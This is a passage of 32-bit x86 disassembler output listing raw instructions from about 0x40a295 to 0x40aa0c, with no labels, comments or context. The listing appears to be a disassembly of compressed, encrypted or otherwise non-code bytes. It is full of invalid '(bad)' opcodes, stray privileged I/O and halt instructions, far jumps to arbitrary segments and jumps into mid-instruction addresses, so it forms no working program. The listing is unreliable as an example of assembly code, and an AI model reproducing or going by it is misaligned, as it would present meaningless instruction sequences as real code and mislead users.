  40a295:	jp     0x40a2d0
  40a297:	sub    ch,BYTE PTR [ebx-0x1c504fdf]
  40a29d:	sar    eax,0x2e
  40a2a0:	push   cs
  40a2a1:	cmp    al,0x5a
  40a2a3:	pop    ds
  40a2a4:	mov    esp,0x444bccbc
  40a2a9:	jl     0x40a305
  40a2ab:	and    edi,DWORD PTR [ebx-0x458cffbb]
  40a2b1:	fild   DWORD PTR [esi]
  40a2b3:	lea    esp,[ebx-0x4e56ac88]
  40a2b9:	out    dx,al
  40a2ba:	push   eax
  40a2bb:	jle    0x40a2ae
  40a2bd:	jne    0x40a24a
  40a2bf:	add    al,0x55
  40a2c1:	pop    esp
  40a2c2:	ror    BYTE PTR [ecx+0x31c2a2c5],cl
  40a2c8:	push   ecx
  40a2c9:	loopne 0x40a30b
  40a2cb:	xchg   BYTE PTR [ebp+0xe],al
  40a2ce:	cmc    
  40a2cf:	pusha  
  40a2d0:	arpl   WORD PTR [edx],ax
  40a2d2:	push   esp
  40a2d3:	pop    ds
  40a2d4:	cwde   
  40a2d5:	mov    eax,0xe626a90d
  40a2da:	iret   
  40a2db:	mov    bl,0xe1
  40a2dd:	(bad)  
  40a2df:	jmp    0x346d:0xd9aedc04
  40a2e6:	mul    DWORD PTR [esi-0x5603205]
  40a2ec:	push   ecx
  40a2ed:	dec    ecx
  40a2ee:	dec    eax
  40a2ef:	dec    edi
  40a2f0:	mov    bl,0x5b
  40a2f2:	and    ecx,DWORD PTR [edi-0x7d]
  40a2f5:	fdivr  DWORD PTR [edx-0x670438cc]
  40a2fb:	repnz pop ds
  40a2fd:	pusha  
  40a2fe:	(bad)  
  40a2ff:	mov    fs,WORD PTR [ebx]
  40a301:	jle    0x40a358
  40a303:	add    al,0xc5
  40a305:	push   ds
  40a306:	mov    ah,0xda
  40a308:	or     BYTE PTR [edi+0x7a],cl
  40a30b:	sub    esp,DWORD PTR ds:0xa794a3e9
  40a311:	sub    esi,DWORD PTR [edi]
  40a313:	shl    eax,0xbb
  40a316:	cmp    al,0xe1
  40a318:	and    dh,al
  40a31a:	not    ebx
  40a31c:	shl    ebx,0x6d
  40a31f:	push   es
  40a320:	(bad)  
  40a321:	dec    eax
  40a322:	xor    dh,BYTE PTR [eax]
  40a324:	push   cx
  40a326:	leave  
  40a327:	adc    eax,0xce703107
  40a32c:	es jge 0x40a2f2
  40a32f:	mov    WORD PTR [ecx+eax*4+0x23d3d17a],?
  40a336:	pop    edi
  40a337:	jae    0x40a356
  40a339:	mov    DWORD PTR ds:[ecx],ebx
  40a33c:	and    al,0x4c
  40a33e:	fadd   QWORD PTR [eax-0x7a]
  40a341:	in     eax,dx
  40a342:	inc    ebp
  40a343:	shl    BYTE PTR [ebx],0xcb
  40a346:	inc    edi
  40a347:	cmp    DWORD PTR [edx],esi
  40a349:	add    eax,DWORD PTR [edx-0x613c4d44]
  40a34f:	out    0x7a,eax
  40a351:	pop    esi
  40a352:	cmp    al,0x4b
  40a354:	mov    dl,0x9e
  40a356:	adc    eax,0x9a358cb9
  40a35b:	retf   
  40a35c:	dec    esi
  40a35d:	test   DWORD PTR [eax+0x329c5faa],esi
  40a363:	dec    edi
  40a364:	scas   eax,DWORD PTR es:[edi]
  40a365:	xor    dl,BYTE PTR [ecx-0x59]
  40a368:	pop    esi
  40a369:	or     DWORD PTR [ecx+eax*1-0x27],ecx
  40a36d:	imul   ebx,DWORD PTR [edx+0x34bd6e02],0xffffffca
  40a374:	mov    WORD PTR [ecx+0x5615f227],?
  40a37a:	hlt    
  40a37b:	add    dl,BYTE PTR [esp+eax*2]
  40a37e:	add    al,0x82
  40a380:	dec    eax
  40a381:	int3   
  40a382:	sar    BYTE PTR [edx-0x3d],0xf
  40a386:	imul   ebp,DWORD PTR [esi+0x496ea72],0x4a4f6834
  40a390:	enter  0xa068,0x93
  40a394:	ror    esi,cl
  40a396:	push   edx
  40a397:	gs pop ebp
  40a399:	call   0x11d:0x88aa2db8
  40a3a0:	cs add eax,0xfa44913a
  40a3a6:	popa   
  40a3a7:	(bad)  
  40a3a8:	(bad)  
  40a3a9:	adc    eax,0xb62053e2
  40a3ae:	cmc    
  40a3af:	or     ebx,DWORD PTR [ebx-0x4f51700f]
  40a3b5:	lods   al,BYTE PTR ds:[esi]
  40a3b6:	xor    BYTE PTR [edi-0x43],ah
  40a3b9:	dec    esi
  40a3ba:	xchg   ecx,esp
  40a3bc:	xchg   edx,eax
  40a3bd:	pusha  
  40a3be:	bound  esi,QWORD PTR [edi]
  40a3c0:	dec    ebp
  40a3c1:	or     edx,DWORD PTR [edx-0x2c]
  40a3c4:	das    
  40a3c5:	fcmovnb st,st(6)
  40a3c7:	xchg   BYTE PTR [eax-0x22960da9],al
  40a3cd:	lods   eax,DWORD PTR ds:[esi]
  40a3ce:	fistp  QWORD PTR [edi-0x3f33c420]
  40a3d4:	ret    
  40a3d5:	inc    ebx
  40a3d6:	cmp    eax,0xd63e581
  40a3db:	rol    BYTE PTR [ebx-0x4182d4b],0x86
  40a3e2:	leave  
  40a3e3:	and    eax,0x58c844b1
  40a3e8:	dec    ecx
  40a3e9:	dec    ebx
  40a3ea:	inc    ebp
  40a3eb:	daa    
  40a3ec:	fiadd  WORD PTR [esi]
  40a3ee:	call   0x86a9:0xd7898161
  40a3f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3f6:	ret    0xe4c8
  40a3f9:	adc    esp,DWORD PTR [ebx-0x40]
  40a3fc:	cmp    BYTE PTR [ebp-0x6889d355],al
  40a402:	add    eax,0x9d252865
  40a407:	enter  0x7ec5,0x54
  40a40b:	in     eax,dx
  40a40c:	lahf   
  40a40d:	cdq    
  40a40e:	adc    eax,0x8e5b94d3
  40a413:	xlat   BYTE PTR ds:[ebx]
  40a414:	in     eax,dx
  40a415:	xchg   BYTE PTR [ecx-0x6d],bl
  40a418:	aas    
  40a419:	ins    BYTE PTR es:[edi],dx
  40a41a:	cmc    
  40a41b:	test   al,0x6f
  40a41d:	test   al,0x1
  40a41f:	mov    ecx,0xd1cd83f8
  40a424:	sar    BYTE PTR [ebx+0x1c7edc8d],1
  40a42a:	test   BYTE PTR [ebp-0x56],0x7d
  40a42e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a42f:	inc    esi
  40a430:	or     BYTE PTR [ebp-0x9],dh
  40a433:	(bad)  
  40a434:	shl    BYTE PTR [eax],cl
  40a436:	jae    0x40a3cb
  40a438:	cmp    ebp,eax
  40a43a:	test   eax,0xcd096ea5
  40a43f:	pusha  
  40a440:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40a442:	clc    
  40a443:	push   ss
  40a444:	dec    ebp
  40a445:	addr16 icebp 
  40a447:	jno    0x40a45c
  40a449:	cmp    ebx,esi
  40a44b:	or     dl,BYTE PTR [eax]
  40a44d:	dec    edi
  40a44e:	and    eax,0x1e429eae
  40a453:	hlt    
  40a454:	in     eax,dx
  40a455:	aam    0x29
  40a457:	nop
  40a458:	pop    es
  40a459:	test   DWORD PTR [esi+0x5b603282],ebx
  40a45f:	adc    al,0x22
  40a461:	mov    ch,0x6
  40a463:	jle    0x40a404
  40a465:	sub    bh,BYTE PTR [edx+0x6cc12388]
  40a46b:	jecxz  0x40a4d3
  40a46d:	aaa    
  40a46e:	xor    al,0xe0
  40a470:	jb     0x40a4c1
  40a472:	mov    edx,db3
  40a475:	jmp    0x40a402
  40a477:	mov    ch,0x71
  40a479:	nop
  40a47a:	shr    dh,0xb8
  40a47d:	retf   
  40a47e:	out    0x8c,eax
  40a480:	sub    BYTE PTR [edi+0x52],cl
  40a483:	or     bl,BYTE PTR [ebx+0x227af50]
  40a489:	fnstenv [ecx+0x1efb808a]
  40a48f:	jb     0x40a4d4
  40a491:	pop    ebp
  40a492:	mov    al,ds:0xc33c56af
  40a497:	push   ss
  40a498:	or     DWORD PTR [ebx],esi
  40a49a:	std    
  40a49b:	sub    eax,DWORD PTR [edx-0x3f]
  40a49e:	scas   al,BYTE PTR es:[edi]
  40a49f:	push   edx
  40a4a0:	dec    esp
  40a4a1:	rol    DWORD PTR [ebp+0x4627ee0b],1
  40a4a7:	mov    bh,0x17
  40a4a9:	sbb    edx,ebx
  40a4ab:	stos   DWORD PTR es:[edi],eax
  40a4ac:	mov    ebp,0x5e86eef
  40a4b1:	push   ecx
  40a4b2:	aad    0x7
  40a4b4:	jle    0x40a496
  40a4b6:	mov    bl,0x9b
  40a4b8:	jmp    0x40a4a1
  40a4ba:	or     dh,bh
  40a4bc:	or     al,0xd9
  40a4be:	idiv   DWORD PTR [ebx+ecx*4+0x14]
  40a4c2:	pop    edx
  40a4c3:	cs (bad) 
  40a4c5:	jbe    0x40a4d0
  40a4c7:	and    al,BYTE PTR [edx+0x29]
  40a4ca:	in     al,0xd2
  40a4cc:	dec    edi
  40a4cd:	xchg   esp,eax
  40a4ce:	je     0x40a487
  40a4d0:	outs   dx,DWORD PTR ds:[esi]
  40a4d1:	cmc    
  40a4d2:	adc    eax,0xaa03def2
  40a4d7:	mov    ds:0xb091aa59,eax
  40a4dc:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40a4de:	xor    DWORD PTR [edx],eax
  40a4e0:	and    eax,ebp
  40a4e2:	sub    DWORD PTR [eax-0x72979886],0xf990d621
  40a4ec:	mov    DWORD PTR [ebx+ebp*1-0x4563ba80],ebp
  40a4f3:	add    edx,esp
  40a4f5:	dec    ebx
  40a4f6:	xchg   esi,eax
  40a4f7:	inc    esi
  40a4f8:	inc    eax
  40a4f9:	pop    ss
  40a4fa:	ss call 0xbac2:0x81f39bf
  40a502:	sbb    BYTE PTR [edi],cl
  40a504:	push   ss
  40a505:	sub    al,bl
  40a507:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a508:	test   DWORD PTR [eax+0x4bc06cb],ecx
  40a50e:	xchg   edx,eax
  40a50f:	cmc    
  40a510:	push   0x19
  40a512:	std    
  40a513:	cmp    al,0x82
  40a515:	mov    ecx,0x46a0495
  40a51a:	ja     0x40a554
  40a51c:	in     eax,dx
  40a51d:	push   ebx
  40a51e:	fwait
  40a51f:	(bad)  
  40a520:	pop    ebp
  40a521:	arpl   di,bx
  40a523:	call   0x2c737e62
  40a528:	push   es
  40a529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a52a:	cmp    eax,DWORD PTR [ecx+esi*4]
  40a52d:	popa   
  40a52e:	dec    eax
  40a52f:	dec    ebp
  40a530:	adc    ah,BYTE PTR [ebp+0x1c]
  40a533:	push   ds
  40a534:	mov    ecx,0x42f969c9
  40a539:	mov    dh,0xf5
  40a53b:	hlt    
  40a53c:	stc    
  40a53d:	sub    ebp,DWORD PTR [esi+0xb022781]
  40a543:	jge    0x40a4cf
  40a545:	das    
  40a546:	cmp    DWORD PTR [edx+0x75],0xffffffca
  40a54a:	inc    ebx
  40a54b:	hlt    
  40a54c:	ror    DWORD PTR [edx-0x1d56fbaf],cl
  40a552:	sbb    eax,0xf4a2dbc1
  40a557:	ror    DWORD PTR [esi-0x113a8d10],0x59
  40a55e:	mov    eax,0x603ef79b
  40a563:	pop    es
  40a564:	push   eax
  40a565:	in     eax,dx
  40a566:	lods   eax,DWORD PTR ds:[esi]
  40a567:	cmp    al,0x2f
  40a569:	(bad)  
  40a56a:	ror    BYTE PTR [esi],1
  40a56c:	stos   BYTE PTR es:[edi],al
  40a56d:	mov    ds:0x62b75d06,al
  40a572:	cwde   
  40a573:	dec    edx
  40a574:	jp     0x40a5e6
  40a576:	loopne 0x40a536
  40a578:	imul   esi,DWORD PTR [ecx+eiz*2],0xffffff8e
  40a57c:	adc    al,0xde
  40a57e:	and    esi,DWORD PTR [ebx+0xd]
  40a581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a582:	fadd   st(1),st
  40a584:	out    0x55,eax
  40a586:	mov    eax,0xf5a4b82a
  40a58b:	mov    edx,DWORD PTR [edx+0x6a2b6dbf]
  40a591:	jmp    0x40a5da
  40a593:	dec    edx
  40a594:	push   esi
  40a595:	and    DWORD PTR [esi+0x1e],ebp
  40a598:	dec    ebx
  40a599:	shl    DWORD PTR fs:[edx-0x17],cl
  40a59d:	jecxz  0x40a5f5
  40a59f:	loope  0x40a602
  40a5a1:	mov    bl,0xcf
  40a5a3:	daa    
  40a5a4:	inc    edi
  40a5a5:	aam    0x83
  40a5a7:	push   esp
  40a5a8:	(bad)  
  40a5aa:	stos   BYTE PTR es:[edi],al
  40a5ab:	cdq    
  40a5ac:	sub    BYTE PTR [ebp+0x48],ah
  40a5af:	xchg   BYTE PTR [edx-0x1e17f721],al
  40a5b5:	arpl   WORD PTR [edi-0xd],si
  40a5b8:	test   eax,0x259e92e1
  40a5bd:	shl    BYTE PTR [ebp+0x556dea76],1
  40a5c3:	jbe    0x40a5a3
  40a5c5:	sbb    DWORD PTR [esi+0x0],esp
  40a5c8:	icebp  
  40a5c9:	xchg   ecx,eax
  40a5ca:	inc    ecx
  40a5cb:	and    al,0x16
  40a5cd:	lock aas 
  40a5cf:	aas    
  40a5d0:	dec    esp
  40a5d1:	rcr    eax,0xae
  40a5d4:	push   ds
  40a5d5:	and    al,0xbb
  40a5d7:	daa    
  40a5d8:	xor    ecx,DWORD PTR [esi-0x6b2de717]
  40a5de:	loope  0x40a5c2
  40a5e0:	inc    ebx
  40a5e1:	call   0xcd5a8892
  40a5e6:	out    0x17,eax
  40a5e8:	loope  0x40a652
  40a5ea:	fist   WORD PTR [ecx]
  40a5ec:	hlt    
  40a5ed:	(bad)  
  40a5ee:	out    0xa2,al
  40a5f0:	rep stos BYTE PTR es:[edi],al
  40a5f2:	cs dec eax
  40a5f4:	rcr    DWORD PTR [esp+eiz*4+0x38],1
  40a5f8:	cmp    DWORD PTR [ebp-0x2936a5b3],esi
  40a5fe:	jae    0x40a618
  40a600:	mov    bl,0xb8
  40a602:	inc    edx
  40a603:	inc    eax
  40a604:	(bad)  
  40a605:	mov    esi,0x8902c1e6
  40a60a:	mov    ds:0x78b97239,al
  40a60f:	mov    dh,0xfe
  40a611:	call   FWORD PTR [edi+0x530ed41]
  40a617:	mov    dl,0x5c
  40a619:	or     cl,BYTE PTR [ebp-0x3ae29914]
  40a61f:	inc    DWORD PTR [esi]
  40a621:	mov    ecx,0x52c30ec4
  40a626:	enter  0x582f,0x97
  40a62a:	dec    edx
  40a62b:	or     eax,0x9b368a68
  40a630:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a631:	lods   eax,DWORD PTR ds:[esi]
  40a632:	cld    
  40a633:	sti    
  40a634:	sbb    eax,DWORD PTR [esi-0x1e]
  40a637:	mov    dh,0xbe
  40a639:	pop    edx
  40a63b:	mov    edx,ds
  40a63d:	imul   edx,esi,0xffffffeb
  40a640:	lea    ebp,[edx]
  40a642:	mov    bl,0x73
  40a644:	push   edi
  40a645:	loope  0x40a5fb
  40a647:	mov    bh,0xeb
  40a649:	dec    ecx
  40a64a:	and    eax,0x57ee7bc5
  40a64f:	sub    bl,BYTE PTR [edi-0x6f23f147]
  40a655:	adc    DWORD PTR [edx],edi
  40a657:	xchg   esp,eax
  40a658:	adc    al,0xc0
  40a65a:	push   ebp
  40a65b:	xchg   DWORD PTR [esi-0x20ce5343],edx
  40a661:	imul   DWORD PTR [ebx-0x7fd4bc7b]
  40a667:	retf   0xb0f9
  40a66a:	imul   ebp,DWORD PTR [esi-0x5044a503],0x3a795319
  40a674:	dec    edx
  40a675:	pop    ds
  40a676:	add    DWORD PTR [eax-0x15],esp
  40a679:	xchg   ebp,eax
  40a67a:	jnp    0x40a6f8
  40a67c:	cmc    
  40a67d:	fld    st(7)
  40a67f:	mov    eax,0x88922202
  40a684:	cmp    bl,ah
  40a686:	jno    0x40a6e0
  40a688:	rcl    DWORD PTR [ecx-0x6b],cl
  40a68b:	sub    eax,0xef602fb6
  40a690:	push   esp
  40a691:	xor    BYTE PTR [ecx+0x7cb72c11],bl
  40a697:	hlt    
  40a698:	sahf   
  40a699:	sub    ebx,DWORD PTR [ebx]
  40a69b:	(bad)  
  40a69c:	mov    bl,0xfa
  40a69e:	adc    dh,dl
  40a6a0:	adc    al,0x83
  40a6a2:	ds dec ebp
  40a6a4:	dec    eax
  40a6a5:	jmp    0x1158f144
  40a6aa:	and    DWORD PTR [edi],ecx
  40a6ac:	ins    BYTE PTR es:[edi],dx
  40a6ad:	inc    ebx
  40a6ae:	mov    eax,0xe600a488
  40a6b3:	hlt    
  40a6b4:	adc    eax,0x7d095722
  40a6b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6ba:	dec    edx
  40a6bb:	ja     0x40a6bb
  40a6bd:	mov    ebp,0xae3022e2
  40a6c2:	retf   0x6fe0
  40a6c5:	sahf   
  40a6c6:	lock (bad) 
  40a6c8:	mov    ecx,0x5a586d04
  40a6cd:	aam    0x8a
  40a6cf:	je     0x40a6d7
  40a6d1:	sub    DWORD PTR [ebp-0x4a],ebx
  40a6d4:	mov    ds:0x9b3251ac,al
  40a6d9:	xchg   DWORD PTR [edi-0x38],ebx
  40a6dc:	je     0x40a74a
  40a6de:	aaa    
  40a6df:	addr16 inc ebx
  40a6e1:	add    ebp,esp
  40a6e3:	push   0x6809df41
  40a6e8:	scas   al,BYTE PTR es:[edi]
  40a6e9:	ja     0x40a759
  40a6eb:	or     al,0x78
  40a6ed:	cmp    esp,DWORD PTR [edi]
  40a6ef:	inc    ecx
  40a6f0:	push   esp
  40a6f1:	mov    ebp,0x5bd38ae0
  40a6f6:	rcr    DWORD PTR [esi],cl
  40a6f8:	test   eax,0xde9842da
  40a6fd:	jbe    0x40a6e8
  40a6ff:	das    
  40a700:	idiv   BYTE PTR [esi-0x74]
  40a703:	sbb    al,BYTE PTR [esi-0x1893ac98]
  40a709:	jp     0x40a6fd
  40a70b:	add    al,0x99
  40a70d:	xor    DWORD PTR [edi+esi*8],eax
  40a710:	xchg   edx,eax
  40a711:	jecxz  0x40a726
  40a713:	popf   
  40a714:	inc    ecx
  40a715:	jp     0x40a76c
  40a717:	jae    0x40a758
  40a719:	pushf  
  40a71a:	ret    0x4dc6
  40a71d:	xchg   ecx,eax
  40a71e:	inc    eax
  40a71f:	leave  
  40a720:	mov    BYTE PTR [edx+0x75],dl
  40a723:	sahf   
  40a724:	inc    eax
  40a725:	or     eax,0xd357271b
  40a72a:	jle    0x40a6f9
  40a72c:	or     ebx,eax
  40a72e:	fwait
  40a72f:	daa    
  40a730:	adc    ebx,DWORD PTR [esi]
  40a732:	dec    edi
  40a733:	adc    DWORD PTR ds:0x57937856,edi
  40a739:	(bad)  
  40a73a:	repnz sbb al,ch
  40a73d:	lea    edx,[ebp+0x528a98a2]
  40a743:	mov    dl,0x7c
  40a745:	add    dh,BYTE PTR [esi-0x67]
  40a748:	(bad)  
  40a749:	mov    eax,ds:0x5565833b
  40a74e:	dec    ebx
  40a74f:	cmp    eax,0xeeb92db5
  40a754:	call   0xa1b1f083
  40a759:	adc    ch,ch
  40a75b:	repz jle 0x40a6fa
  40a75e:	push   esp
  40a75f:	out    dx,al
  40a760:	cmp    al,0x5b
  40a762:	xor    DWORD PTR [edi-0x49d895ef],edi
  40a768:	mov    al,0x81
  40a76a:	adc    edx,DWORD PTR [edi]
  40a76c:	mov    BYTE PTR [edx],0x1e
  40a76f:	adc    bh,BYTE PTR [edx*8+0x6151f281]
  40a776:	pop    es
  40a777:	mov    eax,0xa98886a3
  40a77c:	pop    ds
  40a77d:	mov    BYTE PTR [esi],al
  40a77f:	sbb    DWORD PTR [edx+esi*8],edx
  40a782:	push   ecx
  40a783:	cld    
  40a784:	int3   
  40a785:	xor    al,bh
  40a787:	int    0x1
  40a789:	mov    ch,0x69
  40a78b:	inc    edi
  40a78c:	dec    BYTE PTR [edx+ebx*4-0x42bda0e1]
  40a793:	cmc    
  40a794:	lock mov WORD PTR [esi],?
  40a797:	jle    0x40a77d
  40a799:	and    al,0x42
  40a79b:	mov    dl,0x56
  40a79d:	and    dh,ch
  40a79f:	pop    es
  40a7a0:	scas   eax,DWORD PTR es:[edi]
  40a7a1:	xor    BYTE PTR [eax],ah
  40a7a3:	dec    ebx
  40a7a4:	lea    edi,[edx+edi*2-0x3]
  40a7a8:	jno    0x40a765
  40a7aa:	lds    esi,FWORD PTR [eax-0x49]
  40a7ad:	(bad)  
  40a7ae:	bound  esi,QWORD PTR [esp+ecx*8]
  40a7b1:	adc    ebp,DWORD PTR [ebp+0x12]
  40a7b4:	xor    ch,BYTE PTR [edi]
  40a7b6:	fild   DWORD PTR [edx-0xc]
  40a7b9:	dec    esp
  40a7ba:	dec    ebp
  40a7bb:	je     0x40a7bf
  40a7bd:	mov    DWORD PTR [ebx-0x45],esi
  40a7c0:	call   0x158e:0x450930bb
  40a7c7:	mov    ch,0xaf
  40a7c9:	cmp    BYTE PTR [ebp-0x28],ah
  40a7cc:	mov    ebp,0x1506515d
  40a7d1:	ins    DWORD PTR es:[edi],dx
  40a7d2:	aam    0x7d
  40a7d4:	(bad)  
  40a7d5:	fmul   st(1),st
  40a7d7:	mov    ebp,DWORD PTR [ecx+0x19]
  40a7da:	pop    ebp
  40a7db:	push   ds
  40a7dc:	jecxz  0x40a7cd
  40a7de:	xor    DWORD PTR [ebp-0x32],0x5a
  40a7e2:	loope  0x40a818
  40a7e4:	out    dx,al
  40a7e5:	nop
  40a7e6:	add    dl,bl
  40a7e8:	cmp    al,0x45
  40a7ea:	pop    ss
  40a7eb:	cmp    BYTE PTR [ebx],0x7
  40a7ee:	out    dx,al
  40a7ef:	inc    ebx
  40a7f0:	pushf  
  40a7f1:	push   ecx
  40a7f2:	cld    
  40a7f3:	aas    
  40a7f4:	aad    0x9d
  40a7f6:	mov    edx,0x29a657fb
  40a7fb:	mov    ds:0xfdeb6dda,al
  40a800:	lahf   
  40a801:	mov    al,ds:0x5f9db86c
  40a806:	adc    eax,0x2805ca86
  40a80b:	call   0x8704:0x76a72d8b
  40a812:	repz pop esp
  40a814:	std    
  40a815:	lods   al,BYTE PTR ds:[esi]
  40a816:	mov    ch,0xd0
  40a818:	sbb    BYTE PTR [ebx-0x635fb27],ch
  40a81e:	rcr    DWORD PTR [esi+0x3a],cl
  40a821:	jmp    0x40a891
  40a823:	push   ebp
  40a824:	jmp    0x40a85a
  40a826:	inc    esp
  40a827:	shr    BYTE PTR [esi+0x7],cl
  40a82a:	xchg   ecx,eax
  40a82b:	xchg   edx,eax
  40a82c:	mov    al,ds:0x9568c27d
  40a831:	shl    DWORD PTR [edx+0x6b],1
  40a834:	cmp    eax,0x5ba34665
  40a839:	mov    dl,0xa9
  40a83b:	fs jle 0x40a8ba
  40a83e:	xchg   esi,eax
  40a83f:	lods   al,BYTE PTR ds:[esi]
  40a840:	inc    esi
  40a841:	push   es
  40a842:	inc    esi
  40a843:	xchg   ebx,eax
  40a844:	xchg   ecx,eax
  40a845:	adc    DWORD PTR [esi-0x56],eax
  40a848:	jbe    0x40a8c8
  40a84a:	xor    cl,bh
  40a84c:	and    BYTE PTR [esi],dl
  40a84e:	add    ecx,DWORD PTR [ebp+0x4a]
  40a851:	mov    bl,0x65
  40a853:	retf   0x5de4
  40a856:	(bad)  
  40a857:	pop    esi
  40a858:	mov    esp,0x7e558f1e
  40a85d:	mov    ah,0xb3
  40a85f:	out    0xd7,eax
  40a861:	xor    al,0x8e
  40a863:	dec    eax
  40a864:	test   al,0x31
  40a866:	mov    WORD PTR [ebx],?
  40a868:	scas   al,BYTE PTR es:[edi]
  40a869:	lahf   
  40a86a:	xor    DWORD PTR [ebp+0x49dbd5b1],ecx
  40a870:	(bad)  
  40a871:	sbb    dl,al
  40a873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a874:	sbb    eax,0x90502f20
  40a879:	add    eax,0x5e315683
  40a87e:	cmp    DWORD PTR [ebp-0x29],edi
  40a881:	jg     0x40a893
  40a883:	dec    ecx
  40a884:	sub    eax,esp
  40a886:	adc    al,0x8d
  40a888:	loop   0x40a8db
  40a88a:	push   es
  40a88b:	mov    ebx,0x8f5d94d3
  40a890:	xor    al,0x53
  40a892:	ins    DWORD PTR es:[edi],dx
  40a893:	js     0x40a896
  40a895:	and    DWORD PTR [ecx+0x414b295c],ebx
  40a89b:	xor    eax,0x384de223
  40a8a0:	or     al,0xfb
  40a8a2:	sub    edx,DWORD PTR [esi+0x6d607a3d]
  40a8a8:	lods   al,BYTE PTR ds:[esi]
  40a8a9:	mov    eax,ds:0xd2fa4f13
  40a8ae:	fisttp DWORD PTR cs:[ecx+0x3a]
  40a8b2:	test   DWORD PTR [eax+0x16],ecx
  40a8b5:	xchg   ebp,eax
  40a8b6:	call   0x7687:0xb9468598
  40a8bd:	jmp    0x90b4:0xd2d0e54
  40a8c4:	sbb    eax,0xe9d7c8e8
  40a8c9:	and    BYTE PTR [edx+0x369c8338],ch
  40a8cf:	mov    cl,0xf9
  40a8d1:	add    al,0x76
  40a8d3:	mov    ah,bh
  40a8d5:	iret   
  40a8d6:	fdivp  st(7),st
  40a8d8:	pop    es
  40a8d9:	fwait
  40a8da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8db:	retf   
  40a8dc:	xchg   ebp,eax
  40a8dd:	pop    edx
  40a8de:	push   ss
  40a8df:	(bad)  
  40a8e0:	pop    edx
  40a8e1:	xor    al,0xd7
  40a8e3:	mov    cl,0x68
  40a8e5:	sbb    al,0x19
  40a8e7:	pop    ecx
  40a8e8:	cmp    eax,0xa0450224
  40a8ed:	inc    esi
  40a8ee:	cmp    BYTE PTR [ebx+0x8],0xc2
  40a8f2:	icebp  
  40a8f3:	dec    edi
  40a8f4:	iret   
  40a8f5:	hlt    
  40a8f6:	xchg   esp,eax
  40a8f7:	fstp   TBYTE PTR [eax-0xc]
  40a8fa:	mov    cl,0x9b
  40a8fc:	mov    ch,0xcc
  40a8fe:	add    cl,BYTE PTR [ecx-0xa]
  40a901:	jmp    0xbe33:0x352b5182
  40a908:	nop
  40a909:	adc    esp,DWORD PTR [esi+0x1a]
  40a90c:	adc    cl,bh
  40a90e:	mov    ecx,0x74e6bfe9
  40a913:	jp     0x40a8d7
  40a915:	xchg   ebx,eax
  40a916:	jns    0x40a898
  40a918:	lsl    edi,cx
  40a91b:	dec    edi
  40a91c:	enter  0xb98a,0x0
  40a920:	test   al,0xef
  40a922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a923:	call   0xda005485
  40a928:	lock out 0x16,al
  40a92b:	in     eax,0x49
  40a92d:	mov    ebx,0x7babb928
  40a932:	test   BYTE PTR [eax-0x54b96c5e],0xd7
  40a939:	loopne 0x40a95b
  40a93b:	jp     0x40a97d
  40a93d:	mov    ebx,0x269a9255
  40a942:	jp     0x40a92c
  40a944:	jne    0x40a982
  40a946:	add    ecx,esp
  40a948:	pop    esi
  40a949:	xor    eax,0xd46111f3
  40a94e:	rcr    ah,0x22
  40a951:	repnz and eax,esi
  40a954:	jmp    0x2b93:0xd1f51051
  40a95b:	test   eax,0x68d72fc2
  40a960:	jmp    0x2afd:0x9b33db89
  40a967:	mov    ah,0xc7
  40a969:	sbb    al,0xc3
  40a96b:	sub    cl,BYTE PTR [eax-0x65d5acce]
  40a971:	adc    eax,0xde86c8d8
  40a976:	sahf   
  40a977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a978:	lahf   
  40a979:	jge    0x40a9bc
  40a97b:	fsubr  st,st(1)
  40a97d:	jbe    0x40a9de
  40a97f:	out    dx,eax
  40a980:	xor    bl,BYTE PTR [edx+0x30f8d831]
  40a986:	or     BYTE PTR [edi+ebx*8+0x13],ch
  40a98a:	and    BYTE PTR [bx+si+0x27],bh
  40a98e:	outs   dx,DWORD PTR ds:[esi]
  40a98f:	hlt    
  40a990:	enter  0xe6dd,0xc6
  40a994:	jne    0x40a9dd
  40a996:	cmp    eax,0x2d191825
  40a99b:	and    dh,BYTE PTR [ebp+edx*2-0xc]
  40a99f:	xor    eax,0xf28484a0
  40a9a4:	jle    0x40a9fa
  40a9a6:	jp     0x40a97b
  40a9a8:	pop    edx
  40a9a9:	or     al,0xcb
  40a9ab:	push   cs
  40a9ac:	jno    0x40a9b5
  40a9ae:	or     esi,DWORD PTR [ebp-0xc]
  40a9b1:	sbb    dl,BYTE PTR [ebx]
  40a9b3:	cmp    eax,0xa0bd51b7
  40a9b8:	inc    ecx
  40a9b9:	pop    eax
  40a9ba:	inc    esp
  40a9bb:	fcom   st(1)
  40a9bd:	in     eax,0xda
  40a9bf:	enter  0x69e4,0x4c
  40a9c3:	push   ecx
  40a9c4:	ins    BYTE PTR es:[edi],dx
  40a9c5:	jg     0x40a996
  40a9c7:	out    0xef,eax
  40a9c9:	xor    DWORD PTR [eax+0x6682765f],eax
  40a9cf:	cmp    dl,BYTE PTR [esi]
  40a9d1:	or     eax,0x3ba9fd14
  40a9d6:	xchg   DWORD PTR [esi+ecx*1+0x44],esi
  40a9da:	sbb    DWORD PTR [eax+0x3],edi
  40a9dd:	fs aaa 
  40a9df:	push   edi
  40a9e0:	stc    
  40a9e1:	dec    ebp
  40a9e2:	in     al,0x1d
  40a9e4:	mov    edx,0x282fe7c1
  40a9e9:	xchg   esp,eax
  40a9ea:	aas    
  40a9eb:	mov    ds:0xce9d5d40,al
  40a9f0:	cmp    DWORD PTR [edi+0x73],eax
  40a9f3:	fwait
  40a9f4:	cmp    DWORD PTR [ecx-0x11ffed3b],0xfffffffd
  40a9fb:	test   eax,0x27e5964a
  40aa00:	sub    eax,0x3fc0439e
  40aa05:	and    BYTE PTR [edx+0xf],dh
  40aa08:	imul   ebp,esi,0xffffffce
  40aa0b:	stc    
  40aa0c:	inc    ecx
